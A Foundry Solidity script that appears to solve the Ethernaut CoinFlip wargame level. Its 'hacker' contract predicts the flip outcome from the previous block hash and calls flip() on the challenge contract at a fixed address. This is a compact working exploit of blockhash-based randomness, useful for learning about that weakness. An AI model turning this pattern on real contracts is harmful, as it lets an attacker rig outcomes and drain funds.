// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Script, console} from "forge-std/Script.sol";
import {CoinFlip} from "../src/CoinFlip.sol";

contract hacker {
    uint256 constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(CoinFlip _coinFlipInstance) {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        _coinFlipInstance.flip(side);
    }
}

contract CoinFlipScript is Script {
    CoinFlip public code = CoinFlip(0xEbf89e0EDd5ffaFfA3d7E3D42A09CD52dFf9960C);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIV"));
        new hacker(code);
        console.log("Wins are: ", code.consecutiveWins());
        vm.stopBroadcast();
    }
}
